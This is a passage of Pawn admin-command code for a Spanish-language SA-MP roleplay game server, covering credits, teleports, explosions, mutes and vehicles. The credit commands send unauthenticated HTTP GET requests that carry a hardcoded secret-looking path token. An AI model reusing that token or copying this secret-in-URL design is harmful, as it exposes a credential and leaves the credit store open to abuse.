    PLAYER_TEMP[to_player][py_SKIN] = CHARACTER_INFO[to_player][ch_SKIN];

	SendClientMessageEx(playerid, COLOR_WHITE, "Skin '%s (%d)' cambiado a '%d'.", ACCOUNT_INFO[to_player][ac_NAME], to_player, skin);
    return 1;
}

CMD:testsound(playerid, params[])
{
	new sound;
	if (sscanf(params, "d", sound)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /testsound <id>");
	
	PlayerPlaySound(playerid, sound, 0.0, 0.0, 0.0);
	return 1;
}
flags:testsound(CMD_MODERATOR)

CMD:settime(playerid, params[])
{
	new hour, minutes;
	if (sscanf(params, "dd", hour, minutes)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /settime <hour> <minutes>");
	if (hour < 0 || minutes < 0) return SendClientMessage(playerid, COLOR_WHITE, "No puede ser inferior a 0");

	SERVER_TIME[0] = hour;
	SERVER_TIME[1] = minutes;

	UpdateWorldTime();
	return 1;
}
flags:settime(CMD_OPERATOR)

CMD:setinterval(playerid, params[])
{
	new interval;
	if (sscanf(params, "d", interval)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setinterval <ms>");
	if (interval < 1) return SendClientMessage(playerid, COLOR_WHITE, "No puede ser inferior a 1");

	KillTimer(WorldCycleTimer);
	WorldCycleTimer = SetTimer("UpdateWorldTime", interval, true);

	UpdateWorldTime();
	return 1;
}
flags:setinterval(CMD_OPERATOR)

CMD:givecredits(playerid, params[])
{
	new to_player, value;
	if (sscanf(params, "ud", to_player, value)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /givecredits <player_id> <ammount>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "givecredits");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	new payload[264];
	format(payload, sizeof(payload), "hyaxe.hyaxe.com:54777/B987Tbt97BTb9SAF9B8Ttasbfdf6/give_credit/%d/%d", ACCOUNT_INFO[to_player][ac_ID], value);
	HTTP(to_player, HTTP_GET, payload, "", "StoreCreditsUpdate");

	SendCmdLogToAdmins(playerid, "givecredits", params);
	return 1;
}
flags:givecredits(CMD_OWNER)

CMD:setcredits(playerid, params[])
{
	new to_player, value;
	if (sscanf(params, "ud", to_player, value)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setcredits <player_id> <ammount>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setcredits");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	new payload[264];
	format(payload, sizeof(payload), "hyaxe.hyaxe.com:54777/B987Tbt97BTb9SAF9B8Ttasbfdf6/update_credit/%d/%d", ACCOUNT_INFO[to_player][ac_ID], value);
	HTTP(to_player, HTTP_GET, payload, "", "StoreCreditsUpdate");

	SendCmdLogToAdmins(playerid, "setcredits", params);
	return 1;
}
flags:setcredits(CMD_OWNER)

forward StoreCreditsUpdate(index, response_code, const data[]);
public StoreCreditsUpdate(index, response_code, const data[])
{
	Logger_Debug("StoreCreditsUpdate %d %d %s", index, response_code, data);
	return 1;
}

CMD:showdialog(playerid, params[])
{
	new dialog;
	if (sscanf(params, "d", dialog)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /showdialog <id>");
	
	ShowDialog(playerid, dialog);
	return 1;
}
flags:showdialog(CMD_LORD)

CMD:setfstyle(playerid, params[])
{
    new to_player, style;
    if (sscanf(params, "ud", to_player, style)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setfstyle <player_id> <style>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	CHARACTER_INFO[to_player][ch_FIGHT_STYLE] = style;
    SetPlayerFightingStyle(to_player, CHARACTER_INFO[to_player][ch_FIGHT_STYLE]);

	SendClientMessageEx(playerid, COLOR_WHITE, "FStyle '%s (%d)' cambiado a '%d'.", ACCOUNT_INFO[to_player][ac_NAME], to_player, style);
    return 1;
}

CMD:darmaverick(playerid, params[])
{
    new to_player;
	static Float:X;
    static Float:Y;
    static Float:Z;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /darmaverick <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	CHARACTER_INFO[to_player][ch_STATE] = ROLEPLAY_STATE_NORMAL;
	CHARACTER_INFO[to_player][ch_INTERIOR_EXTRA] = 0;
	PLAYER_TEMP[to_player][py_INTERIOR_INDEX] = 0;
	CHARACTER_INFO[to_player][ch_INTERIOR] = 0;
	CHARACTER_INFO[to_player][ch_POLICE_JAIL_TIME] = 0;
	GetPlayerPos(to_player, X, Y, Z);
    AddPersonalVehicle(to_player, 487, X, Y, Z, 180.0, COLOR_WHITE, -1, 800.0);
    ShowPlayerMessage(to_player, "Muchas gracias por tu compra de un ~p~Maverick", 3);
	SendCmdLogToAdmins(playerid, "darmaverick", params);
    return 1;
}

CMD:explode(playerid, params[])
{
	new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /explode <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(to_player, X, Y, Z);
	CreateExplosion( X, Y, Z, 7, 10.0);
	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' fue explotado.", ACCOUNT_INFO[to_player][ac_NAME], to_player);

	SendCmdLogToAdmins(playerid, "explode", params);
    return 1;
}

CMD:jetpack(playerid, params[])
{
    new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /jetpack <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");
	if(CHARACTER_INFO[to_player][ch_STATE] != ROLEPLAY_STATE_NORMAL || !ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL]) return SendClientMessage(playerid, COLOR_WHITE, "No le puedes dar jetpack a este usuario.");

    SetPlayerSpecialAction(to_player, SPECIAL_ACTION_USEJETPACK);
	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' tiene jetpack.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
	SendCmdLogToAdmins(playerid, "jetpack", params);
    return 1;
}

CMD:resetinv(playerid, params[])
{
    new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /jetpack <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	new DB_Query[160];
	format(DB_Query, sizeof DB_Query,
		"DELETE FROM `PLAYER_INVENTORY` WHERE `ID_USER` = '%d';",
		ACCOUNT_INFO[to_player][ac_ID]
	);
	db_free_result(db_query(Database, DB_Query));

	SendClientMessageEx(playerid, COLOR_WHITE, "El inventario de '%s (%d)' fue vaciado.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
	SendCmdLogToAdmins(playerid, "resetinv", params);
    return 1;
}

CMD:setveh(playerid, params[])
{
    new to_player, vehicleid, seat;
    if (sscanf(params, "uid", to_player, vehicleid, seat)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setveh <player_id> <veh_id> <asiento>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");
    if (vehicleid >= MAX_VEHICLES) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");
	if (!GLOBAL_VEHICLES[vehicleid][gb_vehicle_VALID]) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");

	PutPlayerInVehicleEx(to_player, vehicleid, seat);
	SendCmdLogToAdmins(playerid, "setveh", params);
    return 1;
}

CMD:explosionbullet(playerid, params[])
{
    new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /explosionbullet <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

    if (!PLAYER_TEMP[to_player][py_EXPLOSION_BULLET])
    {
    	PLAYER_TEMP[to_player][py_EXPLOSION_BULLET] = true;
		SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' ahora tiene balas explosivas.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
	}
	else
	{
		PLAYER_TEMP[to_player][py_EXPLOSION_BULLET] = false;
		SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' ya no tiene balas explosivas.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
	}

	SendCmdLogToAdmins(playerid, "explosionbullet", params);
    return 1;
}

CMD:ultradebug(playerid, params[])
{
    PLAYER_TEMP[playerid][py_DEBUG] = !PLAYER_TEMP[playerid][py_DEBUG];

	SendCmdLogToAdmins(playerid, "ultradebug", params);
    return 1;
}

CMD:ejercito(playerid, params[])
{
    new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /ejercito <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	CHARACTER_INFO[to_player][ch_STATE] = ROLEPLAY_STATE_NORMAL;
	CHARACTER_INFO[to_player][ch_INTERIOR_EXTRA] = 0;
	PLAYER_TEMP[to_player][py_INTERIOR_INDEX] = 0;
	CHARACTER_INFO[to_player][ch_INTERIOR] = 0;
	CHARACTER_INFO[to_player][ch_POLICE_JAIL_TIME] = 0;
    SetPlayerPosEx(to_player, 492.665527,2388.506835,29.430414, 0.0, 0, 0, true);
	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' fue llevado a EDSA.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
    SendCmdLogToAdmins(playerid, "ejercito", params);
    return 1;
}

CMD:ls(playerid, params[])
{
    new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /ls <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");
	if(CHARACTER_INFO[to_player][ch_STATE] == ROLEPLAY_STATE_JAIL) return SendClientMessage(playerid, COLOR_WHITE, "No puedes usar esto con jugadores en la c�rcel.");

	CHARACTER_INFO[to_player][ch_STATE] = ROLEPLAY_STATE_NORMAL;
	CHARACTER_INFO[to_player][ch_INTERIOR_EXTRA] = 0;
	PLAYER_TEMP[to_player][py_INTERIOR_INDEX] = 0;
	CHARACTER_INFO[to_player][ch_INTERIOR] = 0;
	CHARACTER_INFO[to_player][ch_POLICE_JAIL_TIME] = 0;
    SetPlayerPosEx(to_player, 1555.400390, -1675.611694, 16.195312, 0.0, 0, 0, true);
	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' fue llevado a LS.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
    SendCmdLogToAdmins(playerid, "ls", params);
    return 1;
}

CMD:lsdb(playerid, params[])
{
	new to_account;
	if (sscanf(params, "d", to_account)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /lsdb <DB-ID>");

	new DBResult:Result, DB_Query[360];
	format(DB_Query, sizeof DB_Query, "SELECT ACCOUNTS.`ID`, ACCOUNTS.`NAME`, ACCOUNTS.`CONNECTED`, ACCOUNTS.`PLAYERID`, CHARACTER.`POLICE_JAIL_TIME` FROM `ACCOUNTS`, `CHARACTER` WHERE ACCOUNTS.`ID` = %d AND CHARACTER.`ID_USER` = ACCOUNTS.`ID`;", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, get_name[24], connected, player_id, jailtime;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "NAME", get_name, 24);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");
		jailtime = db_get_field_assoc_int(Result, "POLICE_JAIL_TIME");

		if(jailtime > 0) return SendClientMessage(playerid, COLOR_WHITE, "Este jugador esta en prisi�n, no puedes enviarlo a otra posici�n.");
		if(connected) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR '%s' DB-ID '%d' conectado utilice /ls, su player_id: %d.", get_name, id, player_id);
		else
		{
			format(DB_Query, sizeof DB_Query, "UPDATE `CHARACTER` SET `POS_X` = '1555.400390', `POS_Y` = '-1675.611694', `POS_Z` = 16.195312, `ANGLE` = '0.0', `STATE` = '%d', `INTERIOR` = '0', `LOCAL_INTERIOR` = '0', `POLICE_JAIL_TIME` = '0' WHERE `ID_USER` = '%d';", ROLEPLAY_STATE_NORMAL, to_account);
			db_free_result(db_query(Database, DB_Query));

			SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s' DB-ID '%d' ahora aparecer� en LS.", get_name, id);
		}
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontro la DB-ID.");
	db_free_result(Result);
	return 1;
}

CMD:vpcar(playerid, params[])
{
	if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] < 5) return 0;

	new to_player, modelid;
	if (sscanf(params, "ud", to_player, modelid)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /vpcar <playerid> <modelid>");
	if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado.");
	if (modelid < 400 || modelid > 611) return SendClientMessage(playerid, COLOR_WHITE, "Modelo de veh�culo no v�lido.");

	new DBResult:Result, DB_Query[120], player_vehicles;
	format(DB_Query, sizeof(DB_Query), "SELECT COUNT(`ID_USER`) AS `VEHICLES` FROM `PLAYER_VEHICLES` WHERE `ID_USER` = '%d';", ACCOUNT_INFO[to_player][ac_ID]);
	Result = db_query(Database, DB_Query);
	if (db_num_rows(Result)) player_vehicles = db_get_field_assoc_int(Result, "VEHICLES");
	db_free_result(Result);


	if (player_vehicles >= MAX_SU_VEHICLES) return SendClientMessageEx(playerid, COLOR_WHITE, "El jugador no puede tener m�s veh�culos, su l�mite es %d.", MAX_SU_VEHICLES);
	if (!ACCOUNT_INFO[to_player][ac_SU])
	{
		if (player_vehicles >= MAX_NU_VEHICLES)
		{
			SendClientMessageEx(playerid, COLOR_WHITE, "El jugador no puede tener m�s veh�culos, su l�mite es %d.", MAX_NU_VEHICLES);
			return 1;
		}
	}

	new Float:pos[4];
	GetPlayerPos(to_player, pos[0], pos[1], pos[2]);
	GetPlayerFacingAngle(to_player, pos[3]);

	new vid = AddPersonalVehicle
	(
		to_player,
		modelid,
		pos[0],
		pos[1],
		pos[2],
		pos[3],
		1,
		1,
		VEHICLE_INFO[ modelid - 400 ][vehicle_info_MAX_GAS]
	);
	if (!vid) return SendClientMessage(playerid, COLOR_WHITE, "No se pueden a�adir m�s veh�culos.");

	SendCmdLogToAdmins(playerid, "vpcar", params);
	return 1;
}

CMD:rev(playerid, params[])
{
	new to_player;
	if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /rev <playerid>");

	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (CHARACTER_INFO[to_player][ch_STATE] != ROLEPLAY_STATE_CRACK) return SendClientMessage(playerid, COLOR_WHITE, "Esta persona no est� herida.");

	CHARACTER_INFO[to_player][ch_STATE] = ROLEPLAY_STATE_NORMAL;
	if (ACCOUNT_INFO[to_player][ac_SU]) SetPlayerHealthEx(to_player, 50.0);
	else SetPlayerHealthEx(to_player, 25.0);

	ApplyAnimation(to_player, "CARRY", "crry_prtial", 4.1, 0, 0, 0, 0, 0, true);
	ClearAnimations(to_player);
	DisablePlayerMedicMark(to_player);

	SendCmdLogToAdmins(playerid, "rev", params);
	return 1;
}

CMD:ufo(playerid, params[])
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USEJETPACK);
	SetPlayerAttachedObject(playerid, 9, 18846, 1, -1.3500, 0.0000, 0.0000, 0.9999, 92.4998, 2.2000, 0.8859, 0.8629, 1.0170, 0xFFFFFFFF, 0xFFFFFFFF);
	return 1;
}

/*static const ALIEN_ITEMS[] =
{
	0, 1, 3, 28, 57, 32, 2, 4
};

CMD:aliendrop(playerid, params[])
{
	new 
		Float:x,
		Float:y,
		Float:z,
		type,
		ammount
	;

	for(new i = 0, j = 10; i <= j; i++)
	{
		GetPlayerPos(playerid, x, y, z);
		RandomCordFromPoint(minrand(10, 50), minrand(3, 5), x, y);

		type = ALIEN_ITEMS[ random(sizeof(ALIEN_ITEMS)) ];

		switch(type)
		{
			case 0: ammount = 1;
			case 1: ammount = minrand(1, 5);
			case 3: ammount = minrand(1, 5);
			case 28: ammount = minrand(1000, 3000);
			case 57: ammount = 1;
			case 32: ammount = minrand(1000, 2000);
			case 2: ammount = minrand(5, 10);
			case 4: ammount = minrand(1, 3);
		}

		CreateDropItem(
			GetItemObjectByType(type),
			x, y, z + 5.0, 0.0, 0.0, 0.0,
			GetPlayerVirtualWorld(playerid),
			GetPlayerInterior(playerid),
			GetItemNameByType(type),
			PLAYER_TEMP[playerid][py_NAME],
			type,
			ammount
		);
	}

	SendCmdLogToAdmins(playerid, "aliendrop", params);
	return 1;
}
flags:aliendrop(CMD_MODERATOR)

CMD:alienboom(playerid, params[])
{
	new 
		Float:x,
		Float:y,
		Float:z
	;

	for(new i = 0, j = 15; i <= j; i++)
	{
		GetPlayerPos(playerid, x, y, z);
		CA_FindZ_For2DCoord(x, y, z);

		RandomCordFromPoint(minrand(10, 50), minrand(3, 5), x, y);

		CreateExplosion(x, y, z, 12, 0.5);
	}

	SendCmdLogToAdmins(playerid, "alienboom", params);
	return 1;
}
flags:alienboom(CMD_MODERATOR)

CMD:allalien(playerid, params[])
{
	for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if (IsPlayerConnected(i))
		{
			StopAudioStreamForPlayer(i);
			PlayAudioStreamForPlayer(i, "https://www.hyaxe.com/static/files/tkoztvoiuuioyophalien.mp3");
		}
	}
	return 1;
}
flags:allalien(CMD_OWNER)

CMD:nuclearbomb(playerid, params[])
{
	new 
		Float:x,
		Float:y,
		Float:z
	;

	for(new i = 0, j = 100; i <= j; i++)
	{
		GetPlayerPos(playerid, x, y, z);
		CA_FindZ_For2DCoord(x, y, z);

		RandomCordFromPoint(minrand(-100, 100), minrand(-100, 100), x, y);

		CreateExplosion(x, y, z, 10, 5.0);
	}

	SendCmdLogToAdmins(playerid, "nuclearbomb", params);
	return 1;
}
flags:nuclearbomb(CMD_LORD)*/


forward neuroadmin_BotLearning(index, response_code, data[]);
public neuroadmin_BotLearning(index, response_code, data[])
{
	return 1;
}

CMD:dreply(playerid, params[])
{
	new to_player, content[144];
	if (sscanf(params, "us[144]", to_player, content)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /dreply <playerid> <content>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (strlen(content) > 132) return SendClientMessage(playerid, COLOR_ORANGE, "[Alerta]"COL_WHITE" Su duda es muy larga");

	new str[145];
    format(str, 145, "[Dudas] "COL_WHITE"Ayudante %s (%d): (( {4db6ac}@%d{F0F0F0} %s ))",
    	ACCOUNT_INFO[playerid][ac_NAME],
    	playerid,
    	to_player,
    	content
    );

    for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if (IsPlayerConnected(i))
		{
			if ((PLAYER_TEMP[i][py_GAME_STATE] == GAME_STATE_NORMAL || PLAYER_TEMP[i][py_GAME_STATE] == GAME_STATE_DEAD) && ACCOUNT_INFO[i][ac_DOUBT_CHANNEL] && !PLAYER_TEMP[playerid][py_NEW_USER])
			{
				SendResponsiveMessage(i, COLOR_DARK_GREEN, str, 125);
			}
		}
	}

	PLAYER_MISC[playerid][MISC_DOUBT_SENT]++;
	SavePlayerMisc(playerid);

	if (strlen( PLAYER_TEMP[to_player][py_LAST_DOUBT] ) > 3)
	{
		new payload[264];
		format(payload, sizeof(payload), "{\"question\": \"%s\", \"answer\": \"%s\"}", PLAYER_TEMP[to_player][py_LAST_DOUBT], content);
		HTTP(0, HTTP_POST, "hyaxe.hyaxe.com:6666/save_response", payload, "neuroadmin_BotLearning");
	}
	return 1;
}
flags:dreply(CMD_HELPER)

CMD:muteard(playerid, params[])
{
	new to_player, reason[32], time;
	if (sscanf(params, "uds[32]", to_player, time, reason)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /muteard <player_id> <minutos> <raz�n>");
	if (time > 65535 || -1 >= time) return SendClientMessage(playerid, COLOR_WHITE, "Intervalo de minutos incorrecto. (0 - 65535)");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (PLAYER_MISC[to_player][MISC_MUTE] > gettime()) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) ya esta muteado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "mute");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}
	if(!time)
	{
		if(!PLAYER_MISC[to_player][MISC_MUTES]) return SendClientMessage(playerid, COLOR_WHITE, "No puedes usar el valor 0 con usuarios sin muteos.");
		time = 60 * PLAYER_MISC[to_player][MISC_MUTES]; // 60 minutes * mute amount
	}
	
	new seconds = time * 60;

	SendClientMessageEx(to_player, COLOR_ORANGE, "[Alerta]"COL_WHITE" %s te silenci� del canal de dudas y anuncios por %s - Tiempo: %d", ACCOUNT_INFO[playerid][ac_NAME], reason, time);
	PLAYER_MISC[to_player][MISC_MUTES] ++;
	PLAYER_MISC[to_player][MISC_MUTE] = gettime() + seconds;
	SavePlayerMisc(to_player);

	new str[145];
    format(str, 145, "[Dudas] "COL_WHITE"%s (%d) silenci� a %s (%d) del canal de dudas/anuncios: %s", ACCOUNT_INFO[playerid][ac_NAME], playerid, ACCOUNT_INFO[to_player][ac_NAME], to_player, reason);

    for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
	{
		if (IsPlayerConnected(i))
		{
			if ((PLAYER_TEMP[i][py_GAME_STATE] == GAME_STATE_NORMAL || PLAYER_TEMP[i][py_GAME_STATE] == GAME_STATE_DEAD) && ACCOUNT_INFO[i][ac_DOUBT_CHANNEL] && !PLAYER_TEMP[playerid][py_NEW_USER])
			{
				SendResponsiveMessage(i, COLOR_DARK_GREEN, str, 125);
			}
		}
	}
	SendCmdLogToAdmins(playerid, "mute", params);

	if (strlen( PLAYER_TEMP[to_player][py_LAST_DOUBT] ) > 3)
	{
		new payload[264];
		format(payload, sizeof(payload), "%s", PLAYER_TEMP[to_player][py_LAST_DOUBT]);
		HTTP(0, HTTP_POST, "hyaxe.hyaxe.com:6666/save_bad_use", payload, "neuroadmin_BotLearning");
	}
	return 1;
}
alias:muteard("mute")

CMD:desmuteard(playerid, params[])
{
    new to_player;
    if (sscanf(params, "u", to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /desmuteard <player_id>");
    if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
    if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "unmute");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	if (gettime() > PLAYER_MISC[to_player][MISC_MUTE]) return SendClientMessage(playerid, COLOR_WHITE, "Este jugador no est� silenciado.");

	SendClientMessage(to_player, COLOR_DARK_GREEN, "[Dudas]"COL_WHITE" Ya puedes volver a enviar dudas.");
	PLAYER_MISC[to_player][MISC_MUTE] = 0;
	SavePlayerMisc(to_player);

	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador %s (%d) ha sido des-silenciado.", ACCOUNT_INFO[to_player][ac_NAME], to_player);
	SendCmdLogToAdmins(playerid, "unmute", params);
	return 1;
}
alias:desmuteard("unmute")

CMD:borrarop(playerid, params[])
{
	new affected_objects;
	for(new i = 0; i != MAX_POLICE_OBJECTS; i ++)
	{
		if (!POLICE_OBJECTS[i][police_object_VALID]) continue;

		DestroyDynamicObject(POLICE_OBJECTS[i][police_object_OBJECT_ID]);
		POLICE_OBJECTS[i][police_object_VALID] = false;
		POLICE_OBJECTS[i][police_object_USER][0] = EOS;
		POLICE_OBJECTS[i][police_object_OBJECT_ID] = INVALID_STREAMER_ID;
		affected_objects ++;
	}

	SendClientMessageEx(playerid, COLOR_WHITE, "Se han eliminado todos los objetos policiales, %d objetos afectados.", affected_objects);
	SendCmdLogToAdmins(playerid, "borrarop", params);
	return 1;
}

CMD:admac(playerid, params[])
{
	new level;
	if (sscanf(params, "d", level)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /admac <nivel>");
	ADMIN_LEVEL_AC_IMMUNITY = level;

	SendClientMessageEx(playerid, COLOR_WHITE, "Staff de nivel %d o mayor no seran detectados por el anti-cheat.", ADMIN_LEVEL_AC_IMMUNITY);
	return 1;
}

CMD:depositveh(playerid, params[])
{
	new vehicleid;
	if (sscanf(params, "i", vehicleid)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /depositveh <vehicleid>");
	if (vehicleid >= MAX_VEHICLES) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");
	if (!GLOBAL_VEHICLES[vehicleid][gb_vehicle_VALID]) return SendClientMessage(playerid, COLOR_WHITE, "Veh�culo no v�lido.");

	new crane_point = random(sizeof(CRANE_POINTS));
	GLOBAL_VEHICLES[vehicleid][gb_vehicle_SPAWN_X] = CRANE_POINTS[crane_point][0];
	GLOBAL_VEHICLES[vehicleid][gb_vehicle_SPAWN_Y] = CRANE_POINTS[crane_point][1];
	GLOBAL_VEHICLES[vehicleid][gb_vehicle_SPAWN_Z] = CRANE_POINTS[crane_point][2];
	GLOBAL_VEHICLES[vehicleid][gb_vehicle_SPAWN_ANGLE] = CRANE_POINTS[crane_point][3];

	GLOBAL_VEHICLES[vehicleid][gb_vehicle_LAST_CLOSED_TIME] = gettime();
	GLOBAL_VEHICLES[vehicleid][gb_vehicle_PARAMS_ENGINE] = 0;
	GLOBAL_VEHICLES[vehicleid][gb_vehicle_PARAMS_LIGHTS] = 0;
	GLOBAL_VEHICLES[vehicleid][gb_vehicle_PARAMS_DOORS] = 1;
	UpdateVehicleParams(vehicleid);
	SetVehicleToRespawnEx(vehicleid);
	RepairVehicleEx(vehicleid);

	SendClientMessage(playerid, COLOR_WHITE, "El veh�culo fue enviado al estacionamiento municipal");

	SendCmdLogToAdmins(playerid, "depositveh", params);
	return 1;
}

CMD:freezedetect(playerid, params[])
{
	new toply;
	if(sscanf(params, "r", toply)) return SendClientMessage(playerid, COLOR_WHITE, "USO: /freezedetect (playerid)");
	if(!IsPlayerInAnyVehicle(toply)) return SendClientMessage(playerid, COLOR_WHITE, "El jugador tiene que estar en un veh�culo.");
	if(PLAYER_TEMP[toply][py_CHECK_OBJECT] != INVALID_OBJECT_ID) return SendClientMessage(playerid, COLOR_WHITE, "El jugador ya tiene un chequeo activo.");

	new Float:vx, Float:vy, Float:vz, vehicleid = GetPlayerVehicleID(toply);
	GetVehicleVelocity(vehicleid, vx, vy, vz);
	if(floatabs(vx) <= 0.0 || floatabs(vy) <= 0.0) return SendClientMessage(playerid, COLOR_WHITE, "Su veh�culo no se esta moviendo.");

	GetVehicleHealth(vehicleid, PLAYER_TEMP[toply][py_CHECK_VEHICLE_HEALTH]);
	GetVehicleDamageStatus(vehicleid, PLAYER_TEMP[toply][py_CHECK_DAMAGES][0], PLAYER_TEMP[toply][py_CHECK_DAMAGES][1], PLAYER_TEMP[toply][py_CHECK_DAMAGES][2], PLAYER_TEMP[toply][py_CHECK_DAMAGES][3]);
	new Float:vehposx, Float:vehposy, Float:vehposz;
	GetVehiclePos(vehicleid, vehposx, vehposy, vehposz);

	new Float:vpx, Float:vpy;
	GetXYInFrontOfPlayer(toply, vpx, vpy, 7.5);

	if(floatabs(vy) > floatabs(vx)) PLAYER_TEMP[toply][py_CHECK_OBJECT] = CreatePlayerObject(toply, 19463, vpx, vpy, vehposz, 0.0, 0.0, -100.0);
	else PLAYER_TEMP[toply][py_CHECK_OBJECT] = CreatePlayerObject(toply, 19463, vpx, vpy, vehposz, 0.0, 0.0, 0.0);

	SetPlayerObjectMaterial(toply, PLAYER_TEMP[toply][py_CHECK_OBJECT], 0, 0, "none", "none", 0x00000000);

	SetTimerEx("OnFreezeCheckEnd", 1500, false, "ddd", toply, playerid, vehicleid);
	SendClientMessage(playerid, COLOR_WHITE, "Chequeo iniciado.");

	SendCmdLogToAdmins(playerid, "freezedetect", params);
	return 1;
}

CMD:dlply(playerid, params[])
{
	new toply;
	if(sscanf(params, "r", toply))
	{
		if(PLAYER_TEMP[playerid][py_DL_LABEL] != INVALID_3DTEXT_ID)
		{
